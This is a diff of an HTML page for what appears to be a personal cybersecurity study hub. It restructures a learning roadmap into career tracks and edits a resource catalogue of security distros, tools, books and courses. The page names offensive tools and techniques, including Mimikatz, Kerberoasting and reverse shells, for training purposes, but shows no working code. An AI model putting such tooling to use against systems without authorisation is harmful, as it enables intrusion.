+              <li><i class="fa-solid fa-angle-right"></i> Offensive Operations &amp; Penetration Testing</li>
+            </ul>
+          </div>
+          <div class="hq-bento-footer-stat">
+            <span>CAREER PATHWAYS</span>
+            <span>DETAILED BELOW</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- 3 Specialization Pathways: 1. Blue Team, 2. Cloud, 3. Offensive -->
+      <section class="hq-tracks-section" style="margin-top: 8px;">
+        <div class="hq-section-head">
+          <div class="hq-eyebrow">
             <i class="fa-solid fa-route text-crimson"></i>
-            <span>// MASTER STRATEGIC CURRICULUM</span>
+            <span>DOMAIN PATHWAYS</span>
           </div>
-          <h2 class="section-main-heading">
-            The Definitive <span class="text-crimson">Zero-to-Hero</span> Security Roadmap
-          </h2>
-          <p class="section-main-desc">
-            Do not jump straight to exploits. Follow these 5 calculated phases in strict sequence to cultivate elite technical competency from first principles.
+          <h2 class="hq-heading">Specialization Tracks</h2>
+          <p class="hq-subtext">
+            Explore what each cybersecurity discipline entails and the key skills required in the field.
           </p>
+        </div>
 
-          <div class="roadmap-horizontal-list">
-            <!-- Phase 01 -->
-            <div class="roadmap-phase-card">
-              <div class="phase-badge-col">
-                <span class="phase-num">01</span>
-                <span class="phase-sub-tag">MANDATORY ROOT</span>
+        <div class="hq-tracks-grid">
+          <!-- 1. Blue Team Track (FIRST) -->
+          <div class="hq-track-card track-green">
+            <div>
+              <div class="hq-track-header">
+                <span class="hq-track-badge green">1. DEFENSIVE OPERATIONS</span>
+                <i class="fa-solid fa-shield-cat hq-track-icon-green"></i>
               </div>
-              <div class="phase-content-col">
-                <h3>The Bedrock: Linux, Networking &amp; Systems</h3>
-                <p>Mastering the substrate of modern infrastructure. You cannot exploit, harden, or audit systems whose foundational mechanics are unknown to you.</p>
-                <ul class="phase-checklist">
-                  <li><i class="fa-solid fa-circle-check"></i> <span>OSI 7-Layer Architecture &amp; TCP/IP Handshake</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>CIDR Subnetting, ARP, DNS, DHCP Routing</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Linux File Hierarchy, Permissions (chmod/chown)</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Bash Shell Scripting, Cron, Systemd Triage</span></li>
-                </ul>
-                <a href="#books" class="phase-nav-deploy" onclick="switchCategoryFromNav('books', event)">
-                  <i class="fa-solid fa-arrow-right"></i>
-                  <span>NAV DEPLOYMENT: Review Networking Guides in Books &amp; PDFs.</span>
-                </a>
-              </div>
-              <div class="phase-readiness-col">
-                <div class="readiness-label">// EXPECTED READINESS</div>
-                <div class="readiness-desc">Comfortable navigating headless Linux servers and reading raw packet exchanges.</div>
-                <div class="readiness-checkpoint">
-                  <span class="pulsing-dot" style="width: 6px; height: 6px; background: #34d399;"></span>
-                  <span>COMPETENCY CHECKPOINT 01</span>
-                </div>
-              </div>
+              <h3 class="hq-track-title">Blue Team &amp; SOC Incident Response</h3>
+              <p class="hq-track-desc">
+                Defenders continuously monitor networks, triage security alerts, analyze attacker telemetry, and conduct digital forensics to contain and mitigate security breaches.
+              </p>
+              <ul class="hq-track-list">
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-green"></i> Security Operations Center (SOC L1/L2) triage &amp; escalation</li>
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-green"></i> SIEM correlation rules, alert investigations &amp; EDR logs</li>
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-green"></i> Deep packet inspection, pcap carving &amp; protocol analysis</li>
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-green"></i> Digital forensics &amp; incident response (DFIR) workflows</li>
+              </ul>
             </div>
-
-            <!-- Phase 02 -->
-            <div class="roadmap-phase-card" style="border-color: rgba(255, 0, 56, 0.3);">
-              <div class="phase-badge-col">
-                <span class="phase-num" style="color: var(--crimson-light);">02</span>
-                <span class="phase-sub-tag" style="background: rgba(255, 0, 56, 0.2); border-color: var(--crimson-primary);">FIREWALL PROTOCOL</span>
-              </div>
-              <div class="phase-content-col">
-                <h3>Safe Lab Isolation &amp; Hypervisor Setup</h3>
-                <p>Building your personal firing range. True practitioners never fire exploits across unsecured networks or execute raw test malware on host hardware.</p>
-                <ul class="phase-checklist">
-                  <li><i class="fa-solid fa-circle-check"></i> <span>VMware Workstation Pro / VirtualBox Deployment</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Host-Only vs NAT Virtual Network Segregation</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Snapshot Management &amp; Sandbox Clean Reversion</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Deploying Target VMs (Metasploitable 2/3, VulnHub)</span></li>
-                </ul>
-                <a href="#installation-and-use" class="phase-nav-deploy" onclick="switchCategoryFromNav('guides', event)">
-                  <i class="fa-solid fa-arrow-right"></i>
-                  <span>NAV DEPLOYMENT: Follow complete hypervisor blueprint in Installation &amp; Use.</span>
-                </a>
-              </div>
-              <div class="phase-readiness-col">
-                <div class="readiness-label">// EXPECTED READINESS</div>
-                <div class="readiness-desc">A fully sandboxed dual-VM network ready for intrusive packet injection.</div>
-                <div class="readiness-checkpoint">
-                  <span class="pulsing-dot" style="width: 6px; height: 6px; background: #34d399;"></span>
-                  <span>COMPETENCY CHECKPOINT 02</span>
-                </div>
-              </div>
+            <div class="hq-track-footer">
+              <div class="hq-track-roles-label">CAREER ROLES:</div>
+              <div class="hq-track-roles">SOC Analyst &bull; Incident Responder &bull; DFIR Specialist</div>
             </div>
+          </div>
 
-            <!-- Phase 03 -->
-            <div class="roadmap-phase-card">
-              <div class="phase-badge-col">
-                <span class="phase-num">03</span>
-                <span class="phase-sub-tag">DEFENSIVE INTEL</span>
+          <!-- 2. Cloud Security Track (SECOND) -->
+          <div class="hq-track-card track-gold">
+            <div>
+              <div class="hq-track-header">
+                <span class="hq-track-badge gold">2. CLOUD &amp; ARCHITECTURE</span>
+                <i class="fa-solid fa-cloud hq-track-icon-gold"></i>
               </div>
-              <div class="phase-content-col">
-                <h3>Core Arsenal &amp; Reconnaissance Fluency</h3>
-                <p>Information gathering dictates 90% of tactical outcomes. Learn to map network attack surfaces and deconstruct web traffic.</p>
-                <ul class="phase-checklist">
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Port Scanning with Nmap (-sS, -sV, -sC, NSE Scripts)</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Burp Suite Proxy, Intercept, Repeater &amp; Decoder</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Wireshark Live Packet Filters (tcp.flags, http.request)</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Directory &amp; Subdomain Enumeration (Gobuster / ffuf)</span></li>
-                </ul>
-                <a href="#tools" class="phase-nav-deploy" onclick="switchCategoryFromNav('tools', event)">
-                  <i class="fa-solid fa-arrow-right"></i>
-                  <span>NAV DEPLOYMENT: Cross-reference command syntax in Tools tab.</span>
-                </a>
-              </div>
-              <div class="phase-readiness-col">
-                <div class="readiness-label">// EXPECTED READINESS</div>
-                <div class="readiness-desc">Can deliver a full asset inventory and port-service matrix for target infrastructure.</div>
-                <div class="readiness-checkpoint">
-                  <span class="pulsing-dot" style="width: 6px; height: 6px; background: #34d399;"></span>
-                  <span>COMPETENCY CHECKPOINT 03</span>
-                </div>
-              </div>
+              <h3 class="hq-track-title">Cloud Security &amp; DevSecOps</h3>
+              <p class="hq-track-desc">
+                Cloud engineers secure hyperscaler infrastructure (AWS, GCP, Azure), harden containerized orchestrations, and embed automated compliance into delivery pipelines.
+              </p>
+              <ul class="hq-track-list">
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-gold"></i> Cloud IAM least privilege, service boundary enforcement &amp; auditing</li>
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-gold"></i> Kubernetes RBAC, pod security policies &amp; Docker container isolation</li>
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-gold"></i> CI/CD pipeline automation &amp; shift-left SAST/DAST security scanning</li>
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-gold"></i> Infrastructure-as-Code (Terraform) security reviews &amp; compliance</li>
+              </ul>
             </div>
-
-            <!-- Phase 04 -->
-            <div class="roadmap-phase-card">
-              <div class="phase-badge-col">
-                <span class="phase-num">04</span>
-                <span class="phase-sub-tag">VAPT PROXIES</span>
-              </div>
-              <div class="phase-content-col">
-                <h3>Vulnerability Assessment &amp; Exploitation</h3>
-                <p>Transitioning to active exploitation and weakness validation. Uncover how software misconfigurations and unvalidated inputs yield unauthorized access.</p>
-                <ul class="phase-checklist">
-                  <li><i class="fa-solid fa-circle-check"></i> <span>OWASP Top 10: SQLi, XSS, SSRF, IDOR / Broken Access</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Linux Privilege Escalation (SUID binaries, sudo rules)</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Metasploit Framework (msfconsole, handlers, meterpreter)</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Password Auditing &amp; Hash Cracking (Hashcat &amp; John)</span></li>
-                </ul>
-                <a href="#courses" class="phase-nav-deploy" onclick="switchCategoryFromNav('videos', event)">
-                  <i class="fa-solid fa-arrow-right"></i>
-                  <span>NAV DEPLOYMENT: Review web penetration syllabi in Courses.</span>
-                </a>
-              </div>
-              <div class="phase-readiness-col">
-                <div class="readiness-label">// EXPECTED READINESS</div>
-                <div class="readiness-desc">Able to audit vulnerable web apps, produce proof-of-concept exploits, and document remediation.</div>
-                <div class="readiness-checkpoint">
-                  <span class="pulsing-dot" style="width: 6px; height: 6px; background: #34d399;"></span>
-                  <span>COMPETENCY CHECKPOINT 04</span>
-                </div>
-              </div>
+            <div class="hq-track-footer">
+              <div class="hq-track-roles-label">CAREER ROLES:</div>
+              <div class="hq-track-roles">Cloud Security Engineer &bull; DevSecOps &bull; Application Security</div>
             </div>
+          </div>
 
-            <!-- Phase 05 -->
-            <div class="roadmap-phase-card">
-              <div class="phase-badge-col">
-                <span class="phase-num">05</span>
-                <span class="phase-sub-tag">FINAL MASTERY</span>
+          <!-- 3. Offensive Security Track (THIRD) -->
+          <div class="hq-track-card track-red">
+            <div>
+              <div class="hq-track-header">
+                <span class="hq-track-badge red">3. OFFENSIVE OPERATIONS</span>
+                <i class="fa-solid fa-crosshairs hq-track-icon-red"></i>
               </div>
-              <div class="phase-content-col">
-                <h3>CTF Warfare, Defensive Operations &amp; Career</h3>
-                <p>Translating lab competence into real-world professional security roles: SOC Analyst, Penetration Tester, or Cloud Security Engineer.</p>
-                <ul class="phase-checklist">
-                  <li><i class="fa-solid fa-circle-check"></i> <span>TryHackMe / HackTheBox Machine Weaponization</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>SIEM Telemetry &amp; Log Analysis (Splunk, Elastic, Sysmon)</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Active Directory Attack Paths (BloodHound, Kerberoasting)</span></li>
-                  <li><i class="fa-solid fa-circle-check"></i> <span>Professional VAPT Report Writing &amp; CV Preparation</span></li>
-                </ul>
-                <a href="#cheatsheets" class="phase-nav-deploy" onclick="switchCategoryFromNav('cheatsheets', event)">
-                  <i class="fa-solid fa-arrow-right"></i>
-                  <span>NAV DEPLOYMENT: Rapid exploitation cheats in Cheat Sheets.</span>
-                </a>
-              </div>
-              <div class="phase-readiness-col">
-                <div class="readiness-label">// OPERATOR PROFILE</div>
-                <div class="readiness-desc">Armed with live engagement proofs, technical writeups, and defensive triage capabilities.</div>
-                <div class="readiness-checkpoint">
-                  <span class="pulsing-dot" style="width: 6px; height: 6px; background: #34d399;"></span>
-                  <span>DEPLOYMENT READY</span>
-                </div>
-              </div>
+              <h3 class="hq-track-title">Offensive Security &amp; VAPT</h3>
+              <p class="hq-track-desc">
+                Ethical hackers emulate adversary tradecraft to discover systemic flaws, assess perimeter weaknesses, and provide remediation guidance before malicious actors exploit them.
+              </p>
+              <ul class="hq-track-list">
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-red"></i> Web application penetration testing &amp; OWASP Top 10 vulnerabilities</li>
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-red"></i> Active Directory exploitation, Kerberoasting &amp; lateral movement</li>
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-red"></i> Exploit modification, reverse shell orchestration &amp; privilege escalation</li>
+                <li class="hq-track-list-item"><i class="fa-solid fa-check hq-track-check-red"></i> Red Team adversary simulation &amp; stealth assessment methodology</li>
+              </ul>
+            </div>
+            <div class="hq-track-footer">
+              <div class="hq-track-roles-label">CAREER ROLES:</div>
+              <div class="hq-track-roles">Penetration Tester &bull; VAPT Engineer &bull; Red Team Operator</div>
             </div>
           </div>
         </div>
+      </section>
 
-        <!-- Section 2: Specialization Radar -->
-        <div style="margin-bottom: 36px;">
-          <div class="section-eyebrow-tag">
-            <i class="fa-solid fa-crosshairs text-crimson"></i>
-            <span>// SPECIALIZATION RADAR</span>
-          </div>
-          <h2 class="section-main-heading">
-            Target Your <span class="text-crimson">Specialization Pathway</span>
-          </h2>
-          <p class="section-main-desc">
-            Cybersecurity is not a singular monolithic discipline. Pick the branch that aligns with your innate problem-solving instinct.
-          </p>
+    </div>
+    <!-- END ACADEMY HQ COMMAND DECK -->
 
-          <div class="specialization-grid">
-            <!-- Pathway 01: Offensive -->
-            <div class="pathway-card pathway-red">
-              <div>
-                <div class="pathway-header">
-                  <span class="pathway-badge red">PATHWAY 01</span>
-                  <i class="fa-solid fa-skull-crossbones pathway-icon red"></i>
-                </div>
-                <h3 class="pathway-title">Offensive Security &amp; VAPT</h3>
-                <p class="pathway-desc">
-                  Emulate adversary tactics to uncover critical infrastructure vulnerabilities before malicious actors exploit them.
-                </p>
-                <ul class="pathway-list">
-                  <li><i class="fa-solid fa-crosshairs text-crimson"></i> <span>Web Application Penetration Testing</span></li>
-                  <li><i class="fa-solid fa-crosshairs text-crimson"></i> <span>Network Protocol Exploitation</span></li>
-                  <li><i class="fa-solid fa-crosshairs text-crimson"></i> <span>Privilege Escalation &amp; Lateral Movement</span></li>
-                  <li><i class="fa-solid fa-crosshairs text-crimson"></i> <span>Bug Bounty Hunting &amp; Remediation Reports</span></li>
-                </ul>
-              </div>
-              <div class="pathway-footer">
-                <div class="pathway-roles-label">PRIMARY TARGET ROLES:</div>
-                <div class="pathway-roles">Junior Penetration Tester, Bug Hunter, AppSec Analyst</div>
-              </div>
-            </div>
-
-            <!-- Pathway 02: Defensive -->
-            <div class="pathway-card pathway-green">
-              <div>
-                <div class="pathway-header">
-                  <span class="pathway-badge green">PATHWAY 02</span>
-                  <i class="fa-solid fa-shield-halved pathway-icon green"></i>
-                </div>
-                <h3 class="pathway-title">Defensive Operations &amp; SOC</h3>
-                <p class="pathway-desc">
-                  Analyze real-time threat intelligence, triage security alerts, investigate network intrusions, and isolate breaches.
-                </p>
-                <ul class="pathway-list">
-                  <li><i class="fa-solid fa-shield text-crimson" style="color: #10b981;"></i> <span>SIEM Detection Rules (Splunk, Elastic)</span></li>
-                  <li><i class="fa-solid fa-shield text-crimson" style="color: #10b981;"></i> <span>Security Incident Triage &amp; Containment</span></li>
-                  <li><i class="fa-solid fa-shield text-crimson" style="color: #10b981;"></i> <span>Threat Hunting &amp; MITRE ATT&amp;CK Mapping</span></li>
-                  <li><i class="fa-solid fa-shield text-crimson" style="color: #10b981;"></i> <span>Memory &amp; Hard-Drive Digital Forensics</span></li>
-                </ul>
-              </div>
-              <div class="pathway-footer">
-                <div class="pathway-roles-label">PRIMARY TARGET ROLES:</div>
-                <div class="pathway-roles">Tier-1/2 SOC Analyst, Incident Responder, Threat Analyst</div>
-              </div>
-            </div>
-
-            <!-- Pathway 03: Cloud & IAM -->
-            <div class="pathway-card pathway-gold">
-              <div>
-                <div class="pathway-header">
-                  <span class="pathway-badge gold">PATHWAY 03</span>
-                  <i class="fa-solid fa-key pathway-icon gold"></i>
-                </div>
-                <h3 class="pathway-title">IAM &amp; Cloud Architecture</h3>
-                <p class="pathway-desc">
-                  Enforce zero-trust boundaries, provision granular enterprise access, and audit cloud identity attack surfaces.
-                </p>
-                <ul class="pathway-list">
-                  <li><i class="fa-solid fa-lock text-crimson" style="color: #f59e0b;"></i> <span>RBAC, ABAC &amp; Least-Privilege Enforcement</span></li>
-                  <li><i class="fa-solid fa-lock text-crimson" style="color: #f59e0b;"></i> <span>Active Directory &amp; Entra ID Governance</span></li>
-                  <li><i class="fa-solid fa-lock text-crimson" style="color: #f59e0b;"></i> <span>Privileged Access Management (PAM) Solutions</span></li>
-                  <li><i class="fa-solid fa-lock text-crimson" style="color: #f59e0b;"></i> <span>Multi-Cloud IAM Auditing (AWS/GCP/Azure)</span></li>
-                </ul>
-              </div>
-              <div class="pathway-footer">
-                <div class="pathway-roles-label">PRIMARY TARGET ROLES:</div>
-                <div class="pathway-roles">IAM Analyst, Cloud Security Engineer, Identity Architect</div>
-              </div>
-            </div>
-          </div>
+    <!-- ==========================================================================
+         STREAMLINED CATEGORY VIEWS (Courses, Books, Tools, OS, Guides)
+         (Clean header search & count - NO redundant second filter bar!)
+         ========================================================================== -->
+    <div id="hubControlsBar" class="hub-controls-bar">
+      <div class="hub-category-header-box">
+        <div class="hub-search-container">
+          <i class="fa-solid fa-magnifying-glass"></i>
+          <input 
+            type="text" 
+            id="hubSearchInput" 
+            class="hub-search-box" 
+            placeholder="Search within this section (e.g., nmap, wireshark, active directory, kali)..." 
+            oninput="handleSearchChange()" 
+          />
         </div>
 
-        <!-- Section 3: The 4 Golden Rules (Mandatory Ethical Covenant) -->
-        <div class="golden-rules-container">
-          <div class="golden-rules-intro">
-            <div class="section-eyebrow-tag">
-              <i class="fa-solid fa-scale-balanced text-crimson"></i>
-              <span>// ETHICAL COVENANT</span>
-            </div>
-            <h3>The 4 Golden Rules for Every Cybersecurity Student</h3>
-            <p>Adherence to these fundamental principles separates elite ethical security researchers from dangerous or amateur behavior.</p>
-          </div>
-          <div class="golden-rules-grid">
-            <div class="golden-rule-card">
-              <div class="golden-rule-header">
-                <i class="fa-solid fa-gavel text-crimson"></i>
-                <span>01 // Strict Scope &amp; Law</span>
-              </div>
-              <div class="golden-rule-text">
-                Never test or scan a target without explicit written authorization. Practice strictly inside isolated local labs or verified CTF arenas.
-              </div>
-            </div>
-            <div class="golden-rule-card">
-              <div class="golden-rule-header">
-                <i class="fa-solid fa-book-journal-whills text-crimson"></i>
-                <span>02 // Document Everything</span>
-              </div>
-              <div class="golden-rule-text">
-                Memory fades under pressure. Maintain rigorous personal notes using Obsidian, Notion, or Git wikis. Documentation equals retention.
-              </div>
-            </div>
-            <div class="golden-rule-card">
-              <div class="golden-rule-header">
-                <i class="fa-solid fa-code text-crimson"></i>
-                <span>03 // Reject "Script Kiddie" Traps</span>
-              </div>
-              <div class="golden-rule-text">
-                Do not copy-paste automated exploit payloads without reading their code. Understand the underlying vulnerability before firing any script.
-              </div>
-            </div>
-            <div class="golden-rule-card">
-              <div class="golden-rule-header">
-                <i class="fa-solid fa-clock-rotate-left text-crimson"></i>
-                <span>04 // Consistency Over Intensity</span>
-              </div>
-              <div class="golden-rule-text">
-                60 minutes of daily deliberate hands-on practice builds deep muscle memory far faster than a frantic 10-hour binge once a week.
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <!-- Clean Notice Box (Direct informational notification, no duplicate action buttons) -->
-        <div class="welcome-clean-notice">
-          <div class="welcome-clean-notice-text" style="display: flex; align-items: center; gap: 14px; width: 100%;">
-            <i class="fa-solid fa-shield-halved text-crimson" style="font-size: 22px; flex-shrink: 0;"></i>
-            <span><strong>Zero-Clutter Directive:</strong> To maintain optimal focus and zero distraction, study materials are categorized directly into the <strong>Top Header Navigation Bar</strong>. Select any category whenever you are ready to begin.</span>
-          </div>
-        </div>
-
-      </div>
-    </section>
-
-    <!-- Controls Bar: Real-time Search & Filter Tabs -->
-    <section class="hub-controls-bar" id="hubControlsBar" style="display: none;">
-      <div class="hub-search-wrap">
-        <i class="fa-solid fa-magnifying-glass"></i>
-        <input 
-          type="text" 
-          id="hubSearchInput" 
-          class="hub-search-input" 
-          placeholder="Search courses, books, tools, OS, or installation guides (e.g. 'how to install kali linux', 'how to use parrot os', 'nmap', 'burp suite')..." 
-          oninput="handleSearchChange()"
-        />
-      </div>
-
-      <!-- Categories Filter Tabs Bar (With Welcome tab + Split Bar with Installation on Right) -->
-      <div class="hub-filter-bar-split">
-        <div class="hub-filter-tabs-left">
-          <button class="hub-filter-btn" data-category="welcome" onclick="filterCategory('welcome', this)">
-            <i class="fa-solid fa-satellite-dish text-crimson"></i>
-            <span>Academy HQ</span>
-          </button>
-          <button class="hub-filter-btn" data-category="videos" onclick="filterCategory('videos', this)">
-            <i class="fa-solid fa-play-circle text-crimson"></i>
-            <span>Video Courses</span>
-            <span class="hub-filter-count" id="countVideos">0</span>
-          </button>
-          <button class="hub-filter-btn" data-category="books" onclick="filterCategory('books', this)">
-            <i class="fa-solid fa-book-open"></i>
-            <span>Books &amp; PDFs</span>
-            <span class="hub-filter-count" id="countBooks">0</span>
-          </button>
-          <button class="hub-filter-btn" data-category="tools" onclick="filterCategory('tools', this)">
-            <i class="fa-solid fa-wrench"></i>
-            <span>Security Tools</span>
-            <span class="hub-filter-count" id="countTools">0</span>
-          </button>
-          <button class="hub-filter-btn" data-category="os" onclick="filterCategory('os', this)">
-            <i class="fa-solid fa-desktop"></i>
-            <span>Operating Systems</span>
-            <span class="hub-filter-count" id="countOs">0</span>
-          </button>
-          <button class="hub-filter-btn" data-category="cheatsheets" onclick="filterCategory('cheatsheets', this)">
-            <i class="fa-solid fa-file-code"></i>
-            <span>Cheat Sheets</span>
-            <span class="hub-filter-count" id="countCheatsheets">0</span>
-          </button>
-          <button class="hub-filter-btn" data-category="bookmarks" onclick="filterCategory('bookmarks', this)">
-            <i class="fa-solid fa-star text-crimson"></i>
-            <span>Bookmarks</span>
-            <span class="hub-filter-count" id="countBookmarks">0</span>
-          </button>
-        </div>
-
-        <!-- Right Side: Installation & Use Process Guides -->
-        <div class="hub-filter-tabs-right">
-          <button class="hub-filter-btn hub-btn-guides-highlight" data-category="guides" onclick="filterCategory('guides', this)">
-            <i class="fa-solid fa-screwdriver-wrench text-crimson"></i>
-            <span>Installation &amp; Use</span>
-            <span class="hub-filter-count" id="countGuides">9</span>
-          </button>
+        <div class="hub-category-meta-wrap">
+          <span class="hub-category-meta-tag" id="hubSectionBadge">
+            ACTIVE REPOSITORY
+          </span>
+          <span class="hub-results-count" id="hubResultsCount">
+            Displaying all verified items
+          </span>
         </div>
       </div>
+    </div>
 
-      <!-- Results Meta -->
-      <div class="hub-results-meta">
-        <div style="display: flex; align-items: center; gap: 8px;">
-          <span class="hub-section-indicator-badge" id="hubSectionBadge">VIDEO COURSES</span>
-          <span id="hubResultsCount">Displaying verified resources...</span>
-        </div>
-        <span style="color: var(--crimson-light); font-family: var(--font-mono); font-size: 11px;">
-          <i class="fa-solid fa-terminal"></i> ZERO-SEARCH CURATED SYSTEM
-        </span>
-      </div>
-    </section>
-
-    <!-- Resources Dynamic Grid -->
-    <div class="hub-grid" id="hubGrid" style="display: none;">
-      <!-- Injected by JavaScript -->
+    <!-- Active Category Resource Grid -->
+    <div class="hub-grid hub-grid-hidden" id="hubGrid">
+      <!-- Populated dynamically by JavaScript -->
     </div>
 
   </main>
 
-  <!-- Resource Details Modal -->
+  <!-- ==========================================================================
+       SITE FOOTER (Matching Image 2 - Present across all Hub Views)
+       ========================================================================== -->
+  <footer class="site-footer hub-footer" id="hubSiteFooter">
+    <div class="container footer-wrapper">
+      <div class="brand">
+        <div class="brand-logo-frame">
+          <img src="https://lh3.googleusercontent.com/aida-public/AB6AXuCw3OTKaVJOk6JCNAEal73bdmB3TbJ0I-COD9u3rPYTolwZzR6-icxOZuDO6EEDjJa4Qa6avgN-L1Pida92d-DYWAZrvemUWhO13w26V0tBo7qUWazTzoWp-q4qycG6OWhHjinJqv5Skk7bcixkGFWw2X2exLxVBO9YEby8qAEC1R5ObrJvTKW7XtM27bORq6mA7yAsDb7X9LzXEMj50z8Ek-tUUCh9fKYH38Y739QrqYmckilXJCW0BkXn7BHr8Boc_Zc" alt="ZeR0 Logo" referrerpolicy="no-referrer" />
+        </div>
+        <div class="brand-text-wrap">
+          <span class="brand-name">ZeR0<span class="text-crimson">CyB3r</span></span>
+          <span class="brand-sub">PRANSHU VERMAN &bull; CYBERSECURITY ANALYST</span>
+        </div>
+      </div>
+      <div class="footer-center">
+        <span class="footer-hub-badge" onclick="switchCategoryFromNav('welcome', event)">
+          <i class="fa-solid fa-graduation-cap text-crimson"></i> CYBER STUDY HUB
+        </span>
+        <a href="#top" class="footer-top-link" onclick="window.scrollTo({top: 0, behavior: 'smooth'}); return false;">
+          TOP &uarr;
+        </a>
+      </div>
+      <div class="footer-copy">
+        &copy; 2026 ZeR0CyB3r (Pranshu Verman). All Rights Reserved. Pure HTML &amp; CSS.
+      </div>
+    </div>
+  </footer>
+
+  <!-- Universal Modal Dialog for Resource Details & Installation Guides -->
   <div class="hub-modal-overlay" id="hubModalOverlay" onclick="closeHubModal(event)">
     <div class="hub-modal-box" id="hubModalBox">
-      <button class="hub-modal-close" onclick="closeHubModalDirect()"><i class="fa-solid fa-xmark"></i></button>
+      <button type="button" class="hub-modal-close" onclick="closeHubModalDirect()"><i class="fa-solid fa-xmark"></i></button>
       <div id="hubModalContent">
         <!-- Injected via JavaScript -->
       </div>
     </div>
   </div>
 
-  <!-- Toast Notification -->
+  <!-- Toast Notification Messenger -->
   <div class="hub-toast" id="hubToast">
-    <i class="fa-solid fa-circle-check text-crimson"></i>
-    <span id="hubToastMsg">Copied to clipboard!</span>
+    <i class="fa-solid fa-circle-check hub-toast-icon"></i>
+    <span id="hubToastMsg">Action completed successfully</span>
   </div>
 
-  <!-- Footer -->
-  <footer class="auth-footer" style="margin-top: 40px;">
-    <span>&copy; 2026 ZeR0CyB3r // Pranshu Verman &bull; Offensive Security, VAPT &amp; Threat Intelligence Knowledge Vault</span>
-  </footer>
+  <!-- External Master Cybersecurity Datasets & Procedural Guides -->
+  <script src="js/cyber-data.js"></script>
+  <script src="js/guides-data.js"></script>
 
-  <!-- Complete Interactive Knowledge Repository Engine -->
+  <!-- Master Hub Application Logic -->
   <script>
-    // Complete Verified Master Dataset
-    const CYBER_RESOURCES = [
-      // ==========================================
-      // 1. SECURITY OPERATING SYSTEMS (DISTROS)
-      // ==========================================
+    // Core Resources Array (Merged with full datasets from js/cyber-data.js)
+    let CYBER_RESOURCES = [
+      // 1. HARDENED OPERATING SYSTEMS
       {
         id: "os-kali",
         category: "os",
@@ -2604,7 +562,7 @@
       {
         id: "os-tails",
         category: "os",
-        title: "Tails OS (The Amnesic Incognito Live System)",
+        title: "Tails OS (Amnesic Incognito)",
         badgeText: "PRIVACY & ANONYMITY",
         badgeClass: "cat-os",
         icon: "fa-mask",
@@ -2632,9 +590,7 @@
         details: "Includes 140+ native Windows attack tools such as Mimikatz, BloodHound, PowerView, SharpHound, and Burp Suite."
       },
 
-      // ==========================================
-      // 2. INDUSTRY SECURITY TOOLS & WEAPONRY
-      // ==========================================
+      // 2. SECURITY WEAPONS ARSENAL
       {
         id: "tool-burp",
         category: "tools",
@@ -2642,7 +598,7 @@
         badgeText: "WEB VAPT",
         badgeClass: "cat-tools",
         icon: "fa-spider",
-        desc: "The gold standard web application security testing toolkit. Includes HTTP proxy, repeater, decoder, and automated vulnerability scanner.",
+        desc: "The gold standard web application security testing toolkit. Includes HTTP proxy, repeater, decoder, and vulnerability scanner.",
         code: "Proxy 127.0.0.1:8080 &bull; CA Certificate installed",
         tags: ["Web Security", "OWASP Top 10", "Intercept Proxy", "PortSwigger"],
         url: "https://portswigger.net/burp/communitydownload",
@@ -2713,7 +669,7 @@
       {
         id: "tool-hashcat",
         category: "tools",
-        title: "Hashcat &amp; John the Ripper",
+        title: "Hashcat Password Recovery",
         badgeText: "PASSWORD CRACKING",
         badgeClass: "cat-tools",
         icon: "fa-key",
@@ -2756,9 +712,7 @@
         details: "Reveals direct and indirect paths to Domain Admin status by analyzing ACLs, Group Memberships, and Active User Sessions."
       },
 
-      // ==========================================
-      // 3. BOOKS & COMPREHENSIVE PDF GUIDES
-      // ==========================================
+      // 3. BOOKS & FIELD MANUALS
       {
         id: "book-wahh",
         category: "books",
@@ -2792,7 +746,7 @@
       {
         id: "book-bthm",
         category: "books",
-        title: "Blue Team Handbook: Incident Response Edition",
+        title: "Blue Team Handbook: Incident Response",
         badgeText: "SOC INCIDENT RESPONSE",
         badgeClass: "cat-books",
         icon: "fa-shield-cat",
@@ -2822,7 +776,7 @@
       {
         id: "book-owasp-top10",
         category: "books",
-        title: "OWASP Top 10 Official Documentation &amp; PDFs",
+        title: "OWASP Top 10 Official Documentation",
         badgeText: "STANDARD COMPLIANCE",
         badgeClass: "cat-books",
         icon: "fa-file-pdf",
@@ -2835,9 +789,7 @@
         details: "Includes real-world vulnerability scenarios, prevention mechanisms, and references for developers and security auditors."
       },
 
-      // ==========================================
-      // 4. VIDEO MASTERCLASSES & PRACTICAL COURSES
-      // ==========================================
+      // 4. VIDEO MASTERCLASSES & COURSES
       {
         id: "video-soc",
         category: "videos",
@@ -2897,79 +849,103 @@
         actionText: "Watch Bug Bounty Guides",
         level: "All Levels",
         details: "Learn how to build automated asset discovery scripts and approach private bug bounty scopes with methodical precision."
-      },
-
-      // ==========================================
-      // 5. CHEAT SHEETS & RAPID COMMANDS
-      // ==========================================
-      {
-        id: "cheat-revshell",
-        category: "cheatsheets",
